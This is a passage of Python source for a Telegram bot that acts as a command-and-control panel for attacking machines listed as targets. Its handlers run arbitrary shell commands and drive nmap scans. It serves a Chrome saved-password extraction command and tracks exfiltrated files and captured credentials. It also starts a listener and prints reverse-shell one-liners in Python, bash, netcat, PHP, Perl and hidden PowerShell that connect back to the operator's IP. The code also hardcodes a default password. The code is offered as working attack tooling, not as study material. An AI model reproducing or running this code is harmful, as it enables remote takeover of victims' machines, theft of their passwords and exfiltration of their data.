    save_json(ADMINS_PATH, [ADMIN_ID]); save_json(BANNED_PATH, []); save_json(USERS_PATH, []); save_json(LOGS_PATH, []); save_json(NOTIFIED_PATH, [])
    set_password("d4rk123")
    await query.edit_message_text(f"{BOX}\n✅ BOT RESET\n{BOX}\n\nRe-login with d4rk123", parse_mode=ParseMode.MARKDOWN)

async def targets(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM targets ORDER BY last_seen DESC")
    rows = c.fetchall()
    conn.close()
    if not rows:
        await update.message.reply_text("📭 No targets. Use /addtarget", parse_mode=ParseMode.MARKDOWN)
        return
    msg = f"{BOX}\n🎯 TARGETS\n{BOX}\n"
    for row in rows:
        icon = "🟢" if row['status'] == 'active' else "🔴"
        msg += f"\n{icon} ID: `{row['id']}`\n  ├ {row['hostname']} ({row['ip']})\n  └ OS: {row['os'] or 'Unknown'}\n"
    keyboard = []
    for row in rows[:10]:
        keyboard.append([InlineKeyboardButton(f"🎯 {row['hostname']} ({row['ip']})", callback_data=f"target:{row['id']}")])
    keyboard.append([InlineKeyboardButton("🔙 MAIN MENU", callback_data="menu_back")])
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

async def add_target(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /addtarget <hostname> <ip>", parse_mode=ParseMode.MARKDOWN)
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO targets (hostname, ip) VALUES (?, ?)", (context.args[0], context.args[1]))
    conn.commit()
    conn.close()
    await update.message.reply_text(f"✅ Target added: {context.args[0]} ({context.args[1]})", parse_mode=ParseMode.MARKDOWN)

async def remove_target(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /removetarget <target_id>", parse_mode=ParseMode.MARKDOWN)
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("DELETE FROM targets WHERE id = ?", (context.args[0],))
    c.execute("DELETE FROM sessions WHERE target_id = ?", (context.args[0],))
    c.execute("DELETE FROM commands WHERE target_id = ?", (context.args[0],))
    c.execute("DELETE FROM files WHERE target_id = ?", (context.args[0],))
    c.execute("DELETE FROM credentials WHERE target_id = ?", (context.args[0],))
    conn.commit()
    conn.close()
    await update.message.reply_text(f"✅ Target `{context.args[0]}` removed", parse_mode=ParseMode.MARKDOWN)

async def shell(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /shell <target_id>", parse_mode=ParseMode.MARKDOWN)
        return
    target_id = context.args[0]
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM targets WHERE id = ?", (target_id,))
    target = c.fetchone()
    conn.close()
    if not target:
        await update.message.reply_text("❌ Target not found.", parse_mode=ParseMode.MARKDOWN)
        return
    context.user_data['shell_target'] = target_id
    await update.message.reply_text(f"💻 Shell - {target['hostname']}\nSend commands. Use exit to close.", parse_mode=ParseMode.MARKDOWN)

async def cmd(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /cmd <target_id> <command>", parse_mode=ParseMode.MARKDOWN)
        return
    command = ' '.join(context.args[1:])
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if not output:
            output = "[No output]"
        if len(output) > 3500:
            output = output[:3500] + "\n\n...[truncated]..."
        await update.message.reply_text(f"💻 `$ {command}`\n```\n{output}\n```", parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: `{str(e)}`", parse_mode=ParseMode.MARKDOWN)

async def custom_cmd_start(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END
    await update.message.reply_text("✏️ Send command:", parse_mode=ParseMode.MARKDOWN)
    return CUSTOM_CMD

async def custom_cmd_receive(update, context):
    command = update.message.text
    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
    output = result.stdout + result.stderr
    if not output:
        output = "[No output]"
    if len(output) > 3500:
        output = output[:3500] + "\n\n...[truncated]..."
    await update.message.reply_text(f"```\n{output}\n```", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END

async def cancel(update, context):
    await update.message.reply_text("🚫 Cancelled", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END

async def scan(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /scan <target_id> [ports]", parse_mode=ParseMode.MARKDOWN)
        return
    target_id = context.args[0]
    ports = context.args[1] if len(context.args) > 1 else "1-1024"
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT ip FROM targets WHERE id = ?", (target_id,))
    target = c.fetchone()
    conn.close()
    if not target:
        await update.message.reply_text("❌ Target not found.", parse_mode=ParseMode.MARKDOWN)
        return
    await update.message.reply_text(f"🔍 Scanning {target['ip']}:{ports}...", parse_mode=ParseMode.MARKDOWN)
    results = network_scan(target['ip'], ports)
    if not results:
        await update.message.reply_text("📭 No open ports", parse_mode=ParseMode.MARKDOWN)
        return
    msg = f"🔍 Results - {target['ip']}\n"
    for r in results[:20]:
        msg += f"  ├ PORT `{r['port']}` - {r['service']}\n"
    if len(results) > 20:
        msg += f"  └ ... +{len(results)-20} more\n"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def nmap_wrapper(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /nmap <target> [args]", parse_mode=ParseMode.MARKDOWN)
        return
    target = context.args[0]
    args = ' '.join(context.args[1:]) if len(context.args) > 1 else '-sS -sV'
    try:
        result = subprocess.run(f"nmap {args} {target}", shell=True, capture_output=True, text=True, timeout=300)
        output = result.stdout + result.stderr
        if len(output) > 3500:
            output = output[:3500] + "\n\n...[truncated]..."
        await update.message.reply_text(f"```\n{output}\n```", parse_mode=ParseMode.MARKDOWN)
    except FileNotFoundError:
        await update.message.reply_text("❌ nmap not installed.", parse_mode=ParseMode.MARKDOWN)

async def osint(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /osint <target>", parse_mode=ParseMode.MARKDOWN)
        return
    target = context.args[0]
    results = []
    try:
        ip = socket.gethostbyname(target)
        results.append(f"  ├ IP: `{ip}`")
    except:
        pass
    for proto in ['https', 'http']:
        try:
            r = requests.get(f"{proto}://{target}", timeout=10, verify=False)
            h = dict(r.headers)
            results.append(f"  ├ Server: `{h.get('Server', 'N/A')}`")
            break
        except:
            pass
    if not results:
        results.append("  └ No data")
    msg = f"🔍 OSINT - {target}\n" + "\n".join(results)
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def list_files(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /listfiles <target_id>", parse_mode=ParseMode.MARKDOWN)
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM files WHERE target_id = ? ORDER BY exfiltrated_at DESC", (context.args[0],))
    files = c.fetchall()
    conn.close()
    if not files:
        await update.message.reply_text("📭 No files", parse_mode=ParseMode.MARKDOWN)
        return
    msg = "📁 Files\n"
    for f in files:
        size = f"{f['size']/1024:.1f} KB" if f['size'] else "Unknown"
        msg += f"\n  📄 `{f['filename']}` - {size}"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def upload_file_start(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /upload <target_id>", parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END
    context.user_data['upload_target'] = context.args[0]
    await update.message.reply_text("📤 Send file:", parse_mode=ParseMode.MARKDOWN)
    return FILE_UPLOAD

async def upload_file_receive(update, context):
    file = update.message.document or (update.message.photo[-1] if update.message.photo else None)
    if not file:
        await update.message.reply_text("❌ Send a file", parse_mode=ParseMode.MARKDOWN)
        return FILE_UPLOAD
    target_id = context.user_data.get('upload_target')
    if not target_id:
        return ConversationHandler.END
    file_obj = await file.get_file()
    save_path = Path.home() / "d4rk_exfil" / target_id
    save_path.mkdir(parents=True, exist_ok=True)
    filename = getattr(file, 'file_name', None) or f"file_{int(time.time())}"
    local_file = save_path / filename
    await file_obj.download_to_drive(local_file)
    await update.message.reply_text(f"✅ File saved: `{filename}`", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END

async def keylogger(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    await update.message.reply_text("⌨️ Keylogger Simulated\nUse /cmd to execute on target.", parse_mode=ParseMode.MARKDOWN)

async def screenshot(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    await update.message.reply_text("📸 Taking screenshot...", parse_mode=ParseMode.MARKDOWN)
    try:
        img_path = f"/tmp/d4rk_ss_{int(time.time())}.png"
        result = subprocess.run(["scrot", img_path], capture_output=True, timeout=10)
        if os.path.exists(img_path):
            with open(img_path, 'rb') as f:
                await update.message.reply_photo(photo=InputFile(f, filename="screenshot.png"), caption="📸 Screenshot", parse_mode=ParseMode.MARKDOWN)
            os.remove(img_path)
        else:
            await update.message.reply_text("❌ Screenshot failed", parse_mode=ParseMode.MARKDOWN)
    except:
        await update.message.reply_text("❌ Screenshot not available", parse_mode=ParseMode.MARKDOWN)

async def persistence(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    await update.message.reply_text(f"🔗 Persistence Script\n```\n{generate_persistence_script()}\n```\nReplace LHOST and LPORT.", parse_mode=ParseMode.MARKDOWN)

async def browserpass(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    await update.message.reply_text("🔑 Browser Passwords\nChrome:\n```\npython3 -c \"import sqlite3,os; p=os.path.expanduser('~/.config/google-chrome/Default/Login Data'); c=sqlite3.connect(p); for r in c.execute('SELECT origin_url,username_value,password_value FROM logins'): print(r)\"```\nFirefox:\n```ls ~/.mozilla/firefox/*.default-release/logins.json```", parse_mode=ParseMode.MARKDOWN)

async def wifi_enum(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    await update.message.reply_text("📶 WiFi Enumeration", parse_mode=ParseMode.MARKDOWN)
    try:
        result = subprocess.run(["nmcli", "dev", "wifi", "list"], capture_output=True, text=True, timeout=10)
        output = result.stdout[:3500] if result.returncode == 0 else "No WiFi interfaces"
    except:
        output = "Requires nmcli"
    await update.message.reply_text(f"📶 Networks\n```\n{output}\n```", parse_mode=ParseMode.MARKDOWN)

async def brute(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /brute <target> <username> <wordlist>", parse_mode=ParseMode.MARKDOWN)
        return
    await update.message.reply_text("🔨 Brute Force\nRequires hydra installed.", parse_mode=ParseMode.MARKDOWN)

async def listener(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    port = int(context.args[0]) if context.args else 4444
    if context.bot_data.get('listener_running'):
        await update.message.reply_text(f"🔴 Listener running on port {context.bot_data.get('listener_port')}", parse_mode=ParseMode.MARKDOWN)
        return
    await update.message.reply_text(f"🎧 Listener starting on port {port}...\nUse /payload or /vps for shells.", parse_mode=ParseMode.MARKDOWN)
    def start_listener():
        context.bot_data['listener_running'] = True
        context.bot_data['listener_port'] = port
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind(('0.0.0.0', port))
            server.listen(5)
            server.settimeout(1.0)
            while context.bot_data.get('listener_running'):
                try:
                    client, addr = server.accept()
                    t = threading.Thread(target=handle_connection, args=(client, addr, context))
                    t.daemon = True
                    t.start()
                except socket.timeout:
                    continue
                except:
                    break
        except Exception as e:
            print(f"[Listener Error] {e}")
        finally:
            server.close()
            context.bot_data['listener_running'] = False
    t = threading.Thread(target=start_listener, daemon=True)
    t.start()
    context.bot_data['listener_thread'] = t

def handle_connection(client, addr, context):
    print(f"[+] Connection from {addr}")
    client.send(b"KOV C2 Shell\n> ")
    try:
        while True:
            data = client.recv(4096)
            if not data:
                break
            print(f"[Shell Output] {data.decode('utf-8', errors='replace')}")
    except:
        pass
    finally:
        client.close()

async def stop_listener(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    if context.bot_data.get('listener_running'):
        context.bot_data['listener_running'] = False
        await update.message.reply_text("⏹️ Listener stopped", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text("📭 No listener running", parse_mode=ParseMode.MARKDOWN)

async def payload(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /payload <lhost> <lport> [os]\nOS: linux (default), windows", parse_mode=ParseMode.MARKDOWN)
        return
    lhost = context.args[0]
    lport = int(context.args[1])
    os_type = context.args[2] if len(context.args) > 2 else "linux"
    shell_code = generate_reverse_shell(lhost, lport, os_type)
    await update.message.reply_text(f"💉 Payload\nLHOST: `{lhost}`\nLPORT: `{lport}`\nOS: `{os_type}`\n\n```\n{shell_code}\n```\n📋 Execute on target.", parse_mode=ParseMode.MARKDOWN)

async def info(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    s = get_system_info()
    msg = f"{BOX}\n🖥 SYSTEM INFO\n{BOX}\nHostname: `{s['hostname']}`\nOS: `{s['platform']}`\nLocal IP: `{s['ip']}`\nPublic IP: `{s['public_ip']}`\nCPU: `{s['cpu_count']} cores`\nRAM: `{s['memory']}`\nUptime: `{s['uptime']}`\n{BOX}"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def status(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM targets")
    total = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM files")
    files = c.fetchone()[0]
    conn.close()
    ls = "🟢 Running" if context.bot_data.get('listener_running') else "🔴 Stopped"
    msg = f"{BOX}\n📊 STATUS\n{BOX}\n🎯 Targets: `{total}`\n📁 Files: `{files}`\n🎧 Listener: {ls}\n👥 Users: `{len(get_users())}`\n🛡️ Admins: `{len(get_admins())}`\n{BOX}"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def cleanup(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("DELETE FROM commands WHERE executed_at < datetime('now', '-7 days')")
    c.execute("DELETE FROM files WHERE exfiltrated_at < datetime('now', '-7 days')")
    c.execute("DELETE FROM credentials WHERE captured_at < datetime('now', '-7 days')")
    conn.commit()
    conn.close()
    await update.message.reply_text("🧹 Old data cleaned!", parse_mode=ParseMode.MARKDOWN)

async def vps_connect(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    public_ip = get_public_ip()
    local_ip = "Unknown"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except:
        pass
    port = int(context.args[0]) if context.args else 4444
    msg = (
        f"{BOX}\n🌐 VPS CONNECT\n{BOX}\n\n"
        f"Your VPS:\n"
        f"🌍 Public IP: `{public_ip}`\n"
        f"🏠 Local IP: `{local_ip}`\n"
        f"💻 Hostname: `{socket.gethostname()}`\n\n"
        f"Quick Payloads (Port {port}):\n\n"
        f"1️⃣ Python:\n"
        f"```\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{public_ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n```\n\n"
        f"2️⃣ Bash:\n"
        f"```\nbash -i >& /dev/tcp/{public_ip}/{port} 0>&1\n```\n\n"
        f"3️⃣ Netcat:\n"
        f"```\nnc -e /bin/sh {public_ip} {port}\n```\n\n"
        f"4️⃣ PHP:\n"
        f"```\n<?php\n$sock=fsockopen(\"{public_ip}\",{port});\nexec(\"/bin/sh -i <&3 >&3 2>&3\");\n?>\n```\n\n"
        f"5️⃣ Perl:\n"
        f"```\nperl -e 'use Socket;$i=\"{public_ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'\n```\n\n"
        f"6️⃣ PowerShell (Windows):\n"
        f"```\npowershell -NoP -NonI -W Hidden -Exec Bypass -Enc <BASE64>\n```\n\n"
        f"🎧 Listener: {'🟢 Running' if context.bot_data.get('listener_running') else '🔴 Stopped'}\n"
        f"{BOX}"
    )
    keyboard = [
        [InlineKeyboardButton("🎧 START LISTENER", callback_data=f"vps_listener:{port}"),
         InlineKeyboardButton("⏹ STOP", callback_data="vps_stop")],
        [InlineKeyboardButton("🔙 MAIN MENU", callback_data="menu_back")]
    ]
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

async def connect_cmd(update, context):
    if not check_access(update, context):
        await update.message.reply_text("🔒 Authenticate first with /login", parse_mode=ParseMode.MARKDOWN)
        return
    port = int(context.args[0]) if context.args else 4444
    if context.bot_data.get('listener_running'):
        context.bot_data['listener_running'] = False
        time.sleep(0.5)
    public_ip = get_public_ip()
    msg = (
        f"{BOX}\n⚡ AUTO VPS CONNECT\n{BOX}\n\n"
        f"🎧 Starting listener on port `{port}`...\n"
        f"🌍 Public IP: `{public_ip}`\n\n"
        f"Run on target:\n\n"
        f"```\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{public_ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n```\n\n"
        f"Or bash one-liner:\n"
        f"```\nbash -i >& /dev/tcp/{public_ip}/{port} 0>&1```\n\n"
        f"⏳ Waiting for connection...\n"
        f"{BOX}"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
    def start_listener_auto():
        context.bot_data['listener_running'] = True
        context.bot_data['listener_port'] = port
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind(('0.0.0.0', port))
            server.listen(5)
            server.settimeout(1.0)
            while context.bot_data.get('listener_running'):
                try:
                    client, addr = server.accept()
                    context.bot_data['last_connection'] = str(addr)
                    t = threading.Thread(target=handle_connection, args=(client, addr, context))
                    t.daemon = True
                    t.start()
                except socket.timeout:
                    continue
                except:
                    break
        except Exception as e:
            print(f"[Listener Error] {e}")
        finally:
            server.close()
            context.bot_data['listener_running'] = False
    t = threading.Thread(target=start_listener_auto, daemon=True)
    t.start()
    context.bot_data['listener_thread'] = t

async def admin_view_config(update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not is_owner(user_id):
        await query.edit_message_text("❌ Access Denied - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    msg = f"{BOX}\n⚙ CONFIG\n{BOX}\n\nStatus: 🟢 Online\nAdmins: `{len(get_admins())}`\nUsers: `{len(get_users())}`\nBanned: `{len(get_banned())}`\nDatabase: ✅ Connected\nPassword: `********`\n{BOX}"
    keyboard = [[InlineKeyboardButton("🔙 ADMIN PANEL", callback_data="menu_admin")]]
    await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

async def admin_change_pass_start(update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not is_owner(user_id):
        await query.edit_message_text("❌ Access Denied - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END
    await query.edit_message_text(f"{BOX}\n🔐 CHANGE PASSWORD\n{BOX}\n\nSend new password:", parse_mode=ParseMode.MARKDOWN, reply_markup=build_cancel_keyboard())
    return ADMIN_CHANGE_PASS

async def admin_change_pass_receive(update, context):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Access Denied", parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END
    new_pass = update.message.text.strip()
    if len(new_pass) < 4:
        await update.message.reply_text("❌ Min 4 characters. Try again:", parse_mode=ParseMode.MARKDOWN)
        return ADMIN_CHANGE_PASS
    set_password(new_pass)
    add_log("password_changed", user_id)
    await update.message.reply_text(f"{BOX}\n✅ PASSWORD CHANGED\n{BOX}", parse_mode=ParseMode.MARKDOWN)
    await update.message.reply_text(f"{BOX}\n⚙ ADMIN PANEL\n{BOX}", parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
    return ConversationHandler.END

async def admin_logs(update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not is_owner(user_id):
        await query.edit_message_text("❌ Access Denied", parse_mode=ParseMode.MARKDOWN)
        return
    logs = get_logs(20)
    if not logs:
        await query.edit_message_text("📭 No logs", parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
        return
    msg = f"{BOX}\n📜 LOGS\n{BOX}\n\n"
    for log in logs:
        ts = log['timestamp'][:19]
        a = log['action'].replace('_', ' ').title()
        msg += f"• [{ts}] {a}\n  Admin: `{log['admin_id']}`\n\n"
    if len(msg) > 3500:
        msg = msg[:3500] + "\n...[truncated]"
    keyboard = [[InlineKeyboardButton("🔙 ADMIN PANEL", callback_data="menu_admin")]]
    await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

async def admin_dashboard(update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not is_owner(user_id):
        await query.edit_message_text("❌ Access Denied", parse_mode=ParseMode.MARKDOWN)
        return
    msg = f"{BOX}\n📊 DASHBOARD\n{BOX}\n\n👥 Users: `{len(get_users())}`\n🛡️ Admins: `{len(get_admins())}`\n🚫 Banned: `{len(get_banned())}`\n📜 Logs: `{len(load_json(LOGS_PATH))}`\n{BOX}"
    keyboard = [[InlineKeyboardButton("🔙 ADMIN PANEL", callback_data="menu_admin")]]
    await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

async def admin_notifications(update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not is_owner(user_id):
        await query.edit_message_text("❌ Access Denied", parse_mode=ParseMode.MARKDOWN)
        return
    notified = get_notified_users()
    msg = f"{BOX}\n🔔 NOTIFICATIONS\n{BOX}\n\nStatus: 🟢 Enabled\nNotified: `{len(notified)}` users\n\nNew user join notifications sent to admins."
    keyboard = [[InlineKeyboardButton("🔙 ADMIN PANEL", callback_data="menu_admin")]]
    await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

async def admin_backup(update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not is_owner(user_id):
        await query.edit_message_text("❌ Access Denied", parse_mode=ParseMode.MARKDOWN)
        return
    try:
        backup_time = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_path = Path.home() / f"d4rk_backup_{backup_time}"
        backup_path.mkdir(exist_ok=True)
        if DB_PATH.exists():
            shutil.copy2(DB_PATH, backup_path / "database.db")
        if ADMINS_PATH.exists():
            shutil.copy2(ADMINS_PATH, backup_path / "admins.json")
        if BANNED_PATH.exists():
            shutil.copy2(BANNED_PATH, backup_path / "banned.json")
        if USERS_PATH.exists():
            shutil.copy2(USERS_PATH, backup_path / "users.json")
        if LOGS_PATH.exists():
            shutil.copy2(LOGS_PATH, backup_path / "logs.json")
        add_log("backup_created", user_id)
        await query.edit_message_text(f"{BOX}\n💾 BACKUP\n{BOX}\n\nCreated: `{backup_path}`\n📅 `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`", parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
    except Exception as e:
        await query.edit_message_text(f"❌ Failed: `{str(e)}`", parse_mode=ParseMode.MARKDOWN)

ADMIN_ACTION_STATE = range(1)

async def admin_action_start(update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not is_owner(user_id):
        await query.edit_message_text("❌ Access Denied", parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END
    data = query.data
    action_map = {
        "admin_add": ("👥 Send user ID to add as admin:", "add"),
        "admin_remove": ("🗑 Send user ID to remove from admins:", "remove"),
        "admin_ban": ("🚫 Send user ID to ban:", "ban"),
        "admin_unban": ("✅ Send user ID to unban:", "unban"),
    }
    if data in action_map:
        msg, action_type = action_map[data]
        context.user_data['admin_action_type'] = action_type
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_cancel_keyboard())
        return ADMIN_ACTION_STATE
    return ConversationHandler.END

async def admin_action_receive(update, context):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Access Denied", parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END
    action_type = context.user_data.get('admin_action_type')
    text = update.message.text.strip()
    try:
        target_id = int(text)
    except ValueError:
        await update.message.reply_text("❌ Invalid ID.", parse_mode=ParseMode.MARKDOWN, reply_markup=build_cancel_keyboard())
        return ADMIN_ACTION_STATE
    if action_type == "add":
        if add_admin(target_id):
            await update.message.reply_text(f"✅ Admin Added\nID: `{target_id}`", parse_mode=ParseMode.MARKDOWN)
            add_log("admin_added", user_id, target_id)
            try:
                await context.bot.send_message(chat_id=target_id, text=f"{BOX}\n🎉 Promoted\n{BOX}\nRole: Administrator\n\nUse /start.", parse_mode=ParseMode.MARKDOWN)
            except:
                pass
            await notify_admins(context, f"{BOX}\n🔔 Promoted\n{BOX}\nID: `{target_id}`", ParseMode.MARKDOWN)
        else:
            await update.message.reply_text(f"ℹ️ Already an admin.", parse_mode=ParseMode.MARKDOWN)
    elif action_type == "remove":
        if target_id == ADMIN_ID:
            await update.message.reply_text("❌ Cannot remove owner.", parse_mode=ParseMode.MARKDOWN)
        elif remove_admin(target_id):
            await update.message.reply_text(f"✅ Admin Removed\nID: `{target_id}`", parse_mode=ParseMode.MARKDOWN)
            add_log("admin_removed", user_id, target_id)
            try:
                await context.bot.send_message(chat_id=target_id, text=f"{BOX}\n⚠ Removed\n{BOX}\n\nAdmin access revoked.", parse_mode=ParseMode.MARKDOWN)
            except:
                pass
        else:
            await update.message.reply_text(f"ℹ️ Not an admin.", parse_mode=ParseMode.MARKDOWN)
    elif action_type == "ban":
        if target_id == ADMIN_ID or is_admin(target_id):
            await update.message.reply_text("❌ Cannot ban admin.", parse_mode=ParseMode.MARKDOWN)
        elif ban_user(target_id):
            await update.message.reply_text(f"✅ Banned\nID: `{target_id}`", parse_mode=ParseMode.MARKDOWN)
            add_log("user_banned", user_id, target_id)
        else:
            await update.message.reply_text(f"ℹ️ Already banned.", parse_mode=ParseMode.MARKDOWN)
    elif action_type == "unban":
        if unban_user(target_id):
            await update.message.reply_text(f"✅ Unbanned\nID: `{target_id}`", parse_mode=ParseMode.MARKDOWN)
            add_log("user_unbanned", user_id, target_id)
        else:
            await update.message.reply_text(f"ℹ️ Not banned.", parse_mode=ParseMode.MARKDOWN)
    await update.message.reply_text(f"{BOX}\n⚙ ADMIN PANEL\n{BOX}", parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
    return ConversationHandler.END

async def admin_action_cancel(update, context):
    msg = f"{BOX}\n⚙ ADMIN PANEL\n{BOX}"
    if update.callback_query:
        await update.callback_query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
    else:
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
    return ConversationHandler.END

async def button_callback(update, context):
    query = update.callback_query
